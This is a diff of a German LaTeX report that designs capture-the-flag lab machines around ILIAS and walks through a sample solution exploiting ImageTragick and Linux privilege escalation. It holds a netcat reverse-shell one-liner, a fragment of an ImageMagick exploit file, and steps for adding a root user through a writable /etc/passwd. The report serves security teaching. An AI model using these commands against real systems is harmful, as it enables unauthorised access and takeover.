@@ -209,8 +209,7 @@
     \label{subsec:gegenstand-motivation}
     \footnote{In dieser Arbeit wird aus Gründen der besseren Lesbarkeit das generische Maskulinum verwendet. Weibliche und anderweitige Geschlechteridentitäten werden dabei ausdrücklich mitgemeint.}
     Die Zuverlässigkeit moderner IT-Systeme entscheidet über Erfolg oder Misserfolg vieler Firmen, Branchen oder ganzer Nationen.
-    Betroffen sind aber nicht nur große Organisationen, jeder Einzelne kann zum Opfer werden mit schwerwiegenden Folgen.
-    Deshalb wird eines in unserer immer stärker miteinander vernetzten Welt immer wichtiger, die Sicherheit und der Schutz digitaler Infrastruktur.
+    In unserer immer stärker digitalisierten Welt, wird die Sicherheit und der Schutz digitaler Infrastruktur dementsprechend immer wichtiger.
     Dies zeigt auch eine immer weiter zunehmenden Anzahl an Cyberangriffen, die es nötig macht, seine IT-Infrastruktur immer im Blick zu behalten und bestmöglich vor ungewollten Angriffen zu schützen.
     Geschultes IT-Personal mit fundiertenKenntnissen im Umgang mit Schwachstelle ist somit unerlässlich.
     Eine Möglichkeit ein solches Wissen zu erlangen, bietet die Lernplattform \href{https://tryhackme.com/}{TryHackMe}.
@@ -257,8 +256,8 @@
     \label{subsec:CrossSiteScripting}
     Bei \ac{xss} handelt es sich um eine weit verbreitete Schwachstelle, die zudem von der \ac{owasp} geführt wird.
     XSS-Angriffe sind eine Art von Injektion, bei der bösartige Skripte in ansonsten gutartige und vertrauenswürdige Websites eingeschleust werden.
-    XSS-Angriffe treten auf, wenn ein Angreifer eine Webanwendung nutzt, um bösartigen Code, in der Regel in Form eines browserseitigen Skripts, an einen anderen Endbenutzer zu senden~\parencite{xss}.
-    Eine Ursache für das Auftreten von XSS-Schwachstellen ist das Vertrauen in den Nutzer oder schlichtweg eine nicht vorhandene Validierung der Nutzereingaben.
+    XSS-Angriffe treten auf, wenn ein Angreifer eine Webanwendung nutzt, um bösartigen Code, in der Regel in Form eines client-seitigen Skripts, an sein Opfer zu senden~\parencite{xss}.
+    Eine Ursache für das Auftreten von XSS-Schwachstellen ist das Vertrauen in den Nutzer, oftmals einhergehend mit einer nicht vorhandene Validierung der Nutzereingaben.
     Angreifer mit unethischen Absichten erhalten so einen Weg, der es ihnen erlaubt, schädliche Skripte auszuführen und so vertrauliche Informationen zu erlangen.
     Je nach Schwachstelle kann es sich dabei beispielsweise um Session-Cookies oder Zugangsdaten handeln.
     Zudem findet eine Einteilung in zwei Arten von XSS-Angriffen statt:
@@ -270,6 +269,8 @@
     Dies ermöglicht ein Ausführen des schädliche \ac{xss} Skripts, nach jedem Aufruf des Zielservers durch unbedarfte Nutzer.
     Beliebte Beispiele zum Platzieren eines solchen \ac{xss} Skripts sind Forenbeiträge, Kommentare oder Datenbankeinträge.
 
+    \fill
+    \newpage
 
     \subsubsection{CVE-2018-5688}
     \label{subsubsec:CVE-2018-5688}
@@ -286,6 +287,7 @@
     Die Software bietet dabei einen großen Umfang an Funktionen und unterstützt eine Vielzahl an gängigen Dateiformaten, weshalb sie eine große Nutzerschaft in Bereichen wie der Webentwicklung, wissenschaftlichen Forschung, medizinischen Bildgebung und vielen weiteren aufweisen kann.
     Eine der wichtigsten Funktionen, die ImageMagick zu bieten hat, ist das Verarbeiten von Skripten und die Möglichkeit zur Automatisierung.
     Immer gleiche Abläufe für eine Großzahl an Bildern können so vereinfacht werden, weshalb die Software auch in ILIAS eingesetzt wird~\parencite{imagemagick}.
+    Dabei wird die \textit{Convert Funktion} genutzt, um Profilbilder in die richtige Größe zu überführen.
 
 
     \subsubsection{CVE-2016-3714 (ImageTragick)}
@@ -296,9 +298,12 @@
     Da es sich bei ImageMagick um eine Software-Bibliothek handelt, die wie in~\ref{subsec:ImageMagick} bereits erwähnt eine große Nutzerzahl aufweist, war die Schwachstelle zum Zeitpunkt ihrer Entdeckung durch die Sicherheitsfirma Check Point in einer Vielzahl von Softwareprodukten zu finden~\parencite{imageTragicReport}.
     ILIAS verwendet ImageMagic zur Verarbeitung der Profilbilder ihrer Nutzer, weshalb auch ILIAS je nach verwendeter ImageMagick Version von der Sicherheitslücke betroffen war.
 
+    \fill
+    \newpage
+
     \subsection{Privilege Escalation}
     \label{subsec:PrivilegeEscalation}
-    Von Privilege Escalation, zu Deutsch Rechteausweitung, spricht man immer dann, wenn ein vermeintlicher User durch Ausnutzen einer Sicherheitslücke zu mehr Rechten kommt als eigentlich für diesen vorgesehen.
+    Von Privilege Escalation, zu Deutsch Rechteausweitung, spricht man immer dann, wenn ein vermeintlicher User durch Ausnutzen einer Sicherheitslücke zu mehr Rechten kommt als dieser aktuell besitzt.
     Ziel ist es, Zugriff auf Ressourcen oder Bereiche eines Systems zu erhalten, zu denen normalerweise kein Zugang besteht.
     Eine solche Schwachstelle stellt ein ernstes Sicherheitsrisiko dar, da sie einem Angreifer im schlimmsten Falle umfangreiche Kontrolle über das System ermöglicht.
     Grundsätzliche sind zwei Arten der Privilege Escalation zu unterscheiden:
@@ -345,6 +350,14 @@
     In der \ac{vm}2 werden die Zugriffsrechte für die /etc/passwd Datei unter Verwendung des Befehls chmod 777 geändert.
     Der chmod Befehl wird in Linux dazu verwendet, die Zugriffsrechte auf Dateien und Verzeichnisse zu ändern.
     Die hinterlegten Zugriffsrechte für die passwd Datei sehen nunmehr wie folgt aus: rwxrwxrwx.
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{other_pictures/linux_file_permissions.width-1600}
+        \caption{~\parencite{linuxRechteBild}}
+        \label{fig:rechteBild}
+    \end{figure}
+    \noindent
     Dementsprechend ist es jedem Nutzer des Systems gestatte, die Datei zu lesen/read, schreiben/write und auszuführen/execute~\parencite{privilegeEscalationFehlkRechte}.
     Eine solche Fehlkonfiguration führt zu schwerwiegenden Sicherheitsproblemen für das System.
     Angreifer sind so in der Lage auf Nutzerinformationen zuzugreifen, sich eigene Nutzer mit root Rechten anzulegen und so selber root zu werden.
@@ -486,6 +499,8 @@
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 %	Musterlösung
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+    \fill
+    \newpage
 
     \section{Musterlösung}
     \label{sec:musterloesung}
@@ -592,7 +607,7 @@
     \end{figure}
 
     \noindent
-    Jetzt hat Tim alles was er braucht um sich über SSH einzuloggen:
+    Jetzt hat Tim alles, was er braucht, um sich über SSH einzuloggen:
     Port, Nutzername und Passwort. Mit dem Befehl \textit{ssh -p 2222 SuperSecureAndi@<MACHINEIP>} kann sich Andi mit dem eben herausgefundenen Passwort auf die Maschine einwählen.
     Dort werden ihm dann auch direkt zwei Dateien dargelegt: IliasChangeLog.txt und ImportantNote.txt.
 
@@ -620,6 +635,10 @@
     darauf warten von ihm gelüftet zu werden.
 
 
+
+    \fill
+    \newpage
+
     \subsection{Virtuelle Maschine 2}
     \label{subsec:vm2}
     Nachdem TimDerHackerboy sicher erfolgreich durch die \ac{vm}1 gekämpft hat und sogar Credentials für neue ILIAS Version 5.2.4 in die Finger bekam, wird es Zeit für eine neue Aufgabe.
@@ -638,7 +657,7 @@
         \break und \textit{tempAccount01}} .
         \label{fig:loginAlsDev}
     \end{figure}
-    
+
     Komplett vertieft will Tim sich direkt mit den Credentials einloggen.
     Als er die Login-Seite kurz überfliegt, fallen ihm die Wort \textit{using ImageMagic(v6.9.3-8)} direkt auf.
     \begin{figure}[H]
@@ -667,6 +686,7 @@
     Das ist Tim jedoch nicht genug, er möchte eine Reverse Shell.
     Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc Ziel-IP Port –e /bin/bash}.
     Es gilt abschließend den in~\ref{lst:imageMagickExploit} beschriebene Exploit um die Netcat Reverse Shell ergänzen.
+    Durch Ausprobieren musste die Formatierung des Exploits zudem leicht abgeändert werden, da die Reverse Shell sonst nach wenigen Sekunden abbrach.
     Dass der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
     Beim Erstellen des Exploits gilt es zu beachten, dass es sich bei dem Zielserver um einen Linux System handelt, welches nur unix Linebreaks versteht.
     Jedes in Windows geöffnete oder erstellt Datei muss demnach vorher umgewandelt werden, da der Exploit sonst fehlschlagen wird.
@@ -680,7 +700,8 @@
 
     \vspace{0.4cm}
     \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
-        #Als .txt bearbeiten und in einem akzeptiertem Dateiformat speichern
+        #Als .txt bearbeiten und in einem akzeptiertem Dateiformat
+        #speichern
         #Lokale IP und Zielport tauschen
         push graphic-context
         viewbox 0 0 640 480
@@ -802,7 +823,7 @@
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{storyline_bilder_vm2/addUserVersion2}
-        \caption{Neuen root Nutzer mittels echo hinzufügen und den Inhalt der SuperSecretFlag.txt auslesen. Da die bash Teils immer noch instabil ist, wird die Zeil falsch dargestellt. Eingegeben wurde der in Schritt 7. angegeben echo Befehl.}
+        \caption{Neuen root Nutzer mittels echo hinzufügen und den Inhalt der SuperSecretFlag.txt auslesen. Da das Terminal teils immer noch instabil ist, wird die Zeile falsch dargestellt. Eingegeben wurde der in Schritt 7. angegeben echo Befehl.}
         \label{fig:privilegeEscalation1Screenshot2}
     \end{figure}
     \noindent
@@ -907,6 +928,9 @@
     Der crontab kann den Container über den Befehl \textit{docker exec} auf den Container zugreifen, dabei muss man jedoch beachten, dass die flags \textit{-it} nicht gesetzt sind, da sonst eine Interaktive shell gestartet wird.
     Danach muss nur doch die Portweiterleitung eingerichtet werden, was nicht schwer ist, jedoch ein gewisses Verständnis benötigt. Dadurch kann jetzt extern über SSH auf den Ilias Docker Container zugegriffen werden.
 
+
+    \fill
+    \newpage
     \subsection{Virtuelle Maschine 2}
     \label{subsec:vm2LessonsLearned}
     Ein Großteil der beschriebenen Lessons Learned, welche die \ac{vm}s oder Docker betreffen sind aufgrund des relativ gleichen Aufbaus der Maschinen auch auf die \ac{vm}2 anzuwenden.
@@ -916,7 +940,7 @@
     Ein Teil der Lessons Learned entstand nicht nur beim Erstellen der Docker Container und \ac{vm}s, sondern zudem auch beim Erarbeiten der Musterlösung.
     Angefangen beim richtigen Exploit für die ImageMagick Schwachstelle (\ref{subsubsec:CVE-2016-3714}).
     Einen fertigen ImageMagick Exploit mit einer Netcat Reverse Shell ist so nicht direkt zu finden.
-    Stattdessen gilt es wie in~\ref{subsubsec:imageMagickFinden} ausführlich beschrieben, den bereits auf \href{https://www.exploit-db.com/exploits/39767}{\textbf{exlpoit-db}} vorhandenen Exploit um eine Netacat Reverse Shell zu erweitern.
+    Stattdessen gilt es wie in~\ref{subsubsec:imageMagickFinden} ausführlich beschrieben, den bereits auf \href{https://www.exploit-db.com/exploits/39767}{\textbf{exlpoit-db}} vorhandenen Exploit um eine Netcat Reverse Shell zu erweitern.
     Mittels des fertigen Expoits lässt sich die ImageMagick Schwachstelle ausnutzen, doch die dadurch zustande kommende Reverse Shell ist zu instabil um weiterzuarbeiten.
     Eine große Herausforderung bestand daher darin, die Shell so zu stabilisieren, das es möglich war mit einem vollständig funktionstüchtigem Terminal weiterzuarbeiten.
     Denn zuvor war es nicht möglich den installierten Editor nano, die Pfeiltasten zu nutzen oder längere Befehle zu schreiben.
